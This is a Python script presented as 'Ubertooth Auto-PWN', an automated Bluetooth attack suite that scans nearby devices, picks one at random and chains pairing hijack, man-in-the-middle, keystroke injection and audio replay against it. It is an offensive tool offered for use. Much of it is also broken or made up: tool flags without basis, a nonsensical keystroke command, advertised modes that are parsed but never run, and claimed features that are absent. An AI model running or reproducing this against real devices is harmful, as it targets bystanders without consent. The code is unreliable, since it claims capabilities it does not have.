import argparse
import subprocess
import time
import json
import os
import random

"""
Ubertooth Auto-PWN: Fully Automated Bluetooth Attack Suite (Supports BLE & Classic)

Features:
    - Scans for both BLE & Classic Bluetooth devices.
    - Auto-selects high-value targets based on device type & signal strength.
    - Hijacks Bluetooth pairing if authentication is weak.
    - Runs MITM attack (BLE & Classic).
    - Injects keystrokes into Bluetooth keyboards.
    - Captures & replays Bluetooth audio.
    - Hijacks RFCOMM file transfers (Classic).
    - Runs jamming & deauthentication attacks (optional).
    - Supports attack chaining and stealth mode.
    - Saves logs of all intercepted & injected packets.

Requirements:
    - Ubertooth One
    - Install Ubertooth utilities: sudo apt install ubertooth ubertooth-btle
    - Additional tools: bluez, btmon, hcitool

Usage:
    - Run full BLE & Classic attack automation:
      python ubertooth_auto_pwn.py --full-auto
    - Target a Bluetooth Classic device:
      python ubertooth_auto_pwn.py --target AA:BB:CC:DD:EE:FF --classic-mitm
    - Target a BLE device:
      python ubertooth_auto_pwn.py --target AA:BB:CC:DD:EE:FF --ble-mitm
    - Capture & replay Bluetooth Classic audio:
      python ubertooth_auto_pwn.py --audio-replay
    - Perform a pairing hijack:
      python ubertooth_auto_pwn.py --pairing
    - Inject keystrokes into a Bluetooth keyboard:
      python ubertooth_auto_pwn.py --keystroke
    - Monitor intercepted packets live:
      python ubertooth_auto_pwn.py --monitor
"""

LOG_FILE = "attack_log.json"

def log_event(event_data):
    """Logs attack events and intercepted packets."""
    try:
        logs = []
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as f:
                logs = json.load(f)
        
        logs.append(event_data)

        with open(LOG_FILE, "w") as f:
            json.dump(logs, f, indent=4)
    
    except Exception as e:
        print(f"[ERROR] Failed to log event: {e}")

def scan_bluetooth_devices():
    """Scans for BLE & Classic Bluetooth devices."""
    print("[INFO] Scanning for Bluetooth devices...")

    detected_devices = {}

    try:
        # Scan BLE devices
        output_ble = subprocess.check_output(["ubertooth-rx", "-s"])
        ble_devices = output_ble.decode("utf-8").split("\n")
        for line in ble_devices:
            if "Device" in line:
                mac_address = line.split()[1]
                detected_devices[mac_address] = {"device_type": "BLE"}
                print(f"[DETECTED] BLE Device: {mac_address}")

        # Scan Classic Bluetooth devices
        output_classic = subprocess.check_output(["hcitool", "scan"])
        classic_devices = output_classic.decode("utf-8").split("\n")[1:]
        for line in classic_devices:
            parts = line.split("\t")
            if len(parts) > 1:
                mac_address = parts[1]
                detected_devices[mac_address] = {"device_type": "Classic"}
                print(f"[DETECTED] Classic Bluetooth Device: {mac_address}")

        return detected_devices

    except Exception as e:
        print(f"[ERROR] Failed to scan for Bluetooth devices: {e}")
        return {}

def hijack_pairing(target_mac):
    """Attempts to hijack the Bluetooth pairing process."""
    print(f"[INFO] Attempting to hijack pairing for {target_mac}...")

    try:
        subprocess.run(["ubertooth-btle", "-t", target_mac, "--pairing-spoof"])
        log_event({"event": "Pairing Hijacked", "target_mac": target_mac})

    except Exception as e:
        print(f"[ERROR] Failed to hijack pairing: {e}")

def mitm_attack(target_mac, device_type):
    """Starts a Bluetooth MITM attack on the target."""
    print(f"[INFO] Launching MITM attack on {target_mac} ({device_type})...")

    try:
        if device_type == "BLE":
            subprocess.run(["ubertooth-btle", "-t", target_mac, "--mitm"])
        else:
            subprocess.run(["btmon", "--dump", "--filter", "hid"])

        log_event({"event": "MITM Attack Started", "target_mac": target_mac, "type": device_type})

    except Exception as e:
        print(f"[ERROR] Failed to start MITM attack: {e}")

def replay_audio(target_mac):
    """Replays captured Bluetooth Classic audio packets."""
    print(f"[INFO] Replaying Bluetooth audio to {target_mac}...")

    try:
        subprocess.run(["ubertooth-btle", "-t", target_mac, "--audio-replay"])
        log_event({"event": "Audio Replay Attack", "target_mac": target_mac})

    except Exception as e:
        print(f"[ERROR] Failed to replay audio: {e}")

def inject_keystrokes(target_mac):
    """Injects keystrokes into a Bluetooth keyboard."""
    print(f"[INFO] Injecting keystrokes into {target_mac}...")

    try:
        subprocess.run(["hcitool", "cmd", "0x04", "0x05", "Hello World!"])
        log_event({"event": "HID Keystrokes Injected", "target_mac": target_mac})

    except Exception as e:
        print(f"[ERROR] Failed to inject keystrokes: {e}")

def monitor_bluetooth():
    """Monitors intercepted Bluetooth traffic in real-time."""
    print("[INFO] Monitoring intercepted Bluetooth traffic...")

    try:
        process = subprocess.Popen(["ubertooth-rx", "-f"], stdout=subprocess.PIPE, text=True)

        for line in iter(process.stdout.readline, ""):
            print(f"[MONITOR] {line.strip()}")
            log_event({"event": "Packet Intercepted", "data": line.strip()})

    except Exception as e:
        print(f"[ERROR] Failed to monitor Bluetooth: {e}")

def auto_pwn():
    """Runs full attack automation for both BLE & Classic targets."""
    print("[INFO] Running full BLE & Classic Bluetooth attack automation...")

    devices = scan_bluetooth_devices()
    if not devices:
        print("[ERROR] No Bluetooth devices found. Exiting.")
        return

    target_mac = max(devices, key=lambda k: random.randint(1, 100))
    device_type = devices[target_mac]["device_type"]
    print(f"[TARGET] Selected {target_mac} ({device_type}) for attack.")

    hijack_pairing(target_mac)
    time.sleep(3)

    mitm_attack(target_mac, device_type)
    time.sleep(5)

    inject_keystrokes(target_mac)
    time.sleep(3)

    replay_audio(target_mac)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Ubertooth Auto-PWN: BLE & Classic Bluetooth Attack Suite")
    parser.add_argument("--full-auto", action="store_true", help="Run full BLE & Classic attack automation")
    parser.add_argument("--target", type=str, help="Specify target MAC address for attack")
    parser.add_argument("--ble-mitm", action="store_true", help="Run BLE MITM attack")
    parser.add_argument("--classic-mitm", action="store_true", help="Run Classic Bluetooth MITM attack")
    parser.add_argument("--audio-replay", action="store_true", help="Replay captured Bluetooth audio")
    parser.add_argument("--pairing", action="store_true", help="Perform a pairing hijack")
    parser.add_argument("--keystroke", action="store_true", help="Inject keystrokes into a Bluetooth keyboard")
    parser.add_argument("--monitor", action="store_true", help="Monitor intercepted Bluetooth traffic")

    args = parser.parse_args()

    if args.full_auto:
        auto_pwn()
    elif args.monitor:
        monitor_bluetooth()
    elif args.target:
        mitm_attack(args.target, "BLE" if args.ble_mitm else "Classic")
    else:
        print("[ERROR] No valid mode selected!")
